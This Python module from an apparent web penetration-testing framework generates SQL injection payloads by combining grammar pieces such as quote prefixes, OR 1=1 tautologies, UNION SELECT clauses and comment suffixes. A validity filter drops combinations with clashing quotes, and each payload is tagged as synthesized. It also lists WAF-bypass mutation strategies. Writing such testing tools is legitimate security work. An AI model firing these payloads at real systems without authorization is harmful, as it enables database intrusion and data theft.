"""U-FORGE-11 — The Novel Synthesizer.

Generates payloads that exist in no corpus, from the spec's SQLi
grammar verbatim (5 × 4 × 5 × 5 × 3 = 1500 combinations), filtered by
a documented validity rule: a prefix that opens or closes a quote
never combines with a condition that opens its own quote (the
quote-context conflict), and the raw must survive after stripping.

Honesty marking (FORGE-L-1 INGEST_DONT_INVENT applies to the corpus,
not to the operator's own generation): every synthesized payload is
marked source "forge-synthesis" with attribution original_source
"synthesized", license "generated" — nothing synthesized may pose as
ingested, and nothing synthesized enters the corpus automatically.
"""
from __future__ import annotations

import hashlib
from datetime import datetime, timezone

from webpent.forge.schemas import PayloadAttribution
from webpent.models.findings import VulnClass

# Spec corpus, verbatim (U-FORGE-11).
SYNTHESIS_STRATEGIES: dict[str, dict] = {
    "grammar_based": {
        "method": "grammar_fuzzing",
        "generates": "all possible SQL injection payloads within grammar",
    },
    "learned_from_writeups": {
        "method": "pattern_extraction",
        "generates": "payloads similar to those in writeups",
    },
    "bypass_by_mutation": {
        "method": "adversarial_mutation",
        "generates": "WAF-bypass variants",
    },
    "cross_family": {
        "method": "pattern_combining",
        "generates": "novel combinations (e.g., XSS + SSRF)",
    },
}

SQLI_GRAMMAR: dict[str, list[str]] = {
    "prefix": ["", "'", '"', "')", "') --"],
    "operator": ["OR", "AND", "||", "&&"],
    "condition": ["1=1", "1=2", "true", "false", "'1'='1'"],
    "suffix": ["", "--", "#", "/*", "; --"],
    "union_clause": ["", " UNION SELECT ", " UNION ALL SELECT "],
}


def _attribution(raw: str) -> PayloadAttribution:
    return PayloadAttribution(
        payload_id=hashlib.sha256(f"synth|{raw}".encode()).hexdigest()[:16],
        original_source="synthesized",
        original_url="synthesized",
        original_author=None,
        license="generated",
        license_url="n/a",
        ingested_at=datetime.now(timezone.utc),
        source_trust=0.0,
    )


def _payload(raw: str):
    from webpent.forge.schemas import NormalizedPayload
    return NormalizedPayload(
        payload_id=hashlib.sha256(f"synth|{raw}".encode()).hexdigest()[:16],
        family=VulnClass.SQLI,
        subfamily="synthesized",
        raw=raw,
        target_tech=(),
        target_waf=(),
        target_context=("url",),
        complexity="simple",
        source="forge-synthesis",
        attribution=_attribution(raw),
        quality_score=0.0,
        novelty_score=1.0,
        is_polyglot=False,
        chains_with=(),
        requires=("operator_verification",),
    )


def _valid(prefix: str, condition: str, raw: str) -> bool:
    """Documented validity filter (the quote-context conflict rule).

    A prefix that touches the quote context ("'" / '"') must never be
    combined with a condition that opens its own quote — the two
    contexts fight and the combination is never a valid injection.
    """
    if not raw.strip():
        return False
    prefix_quotes = ("'" in prefix) or ('"' in prefix)
    condition_quotes = ("'" in condition) or ('"' in condition)
    if prefix_quotes and condition_quotes:
        return False
    return True


def generate(limit: int | None = None) -> dict:
    """Every grammar combination, validity-filtered and deduplicated."""
    total = (len(SQLI_GRAMMAR["prefix"]) * len(SQLI_GRAMMAR["operator"])
             * len(SQLI_GRAMMAR["condition"]) * len(SQLI_GRAMMAR["suffix"])
             * len(SQLI_GRAMMAR["union_clause"]))
    valid = []
    seen: set[str] = set()
    for prefix in SQLI_GRAMMAR["prefix"]:
        for operator in SQLI_GRAMMAR["operator"]:
            for condition in SQLI_GRAMMAR["condition"]:
                for union_clause in SQLI_GRAMMAR["union_clause"]:
                    for suffix in SQLI_GRAMMAR["suffix"]:
                        raw = (f"{prefix} {operator} {condition}"
                               f"{union_clause}{suffix}").strip()
                        if raw in seen or not _valid(prefix, condition, raw):
                            continue
                        seen.add(raw)
                        valid.append(_payload(raw))
                        if limit is not None and len(valid) >= limit:
                            return {"total_combinations": total,
                                    "valid_payloads": valid}
    return {"total_combinations": total, "valid_payloads": valid}
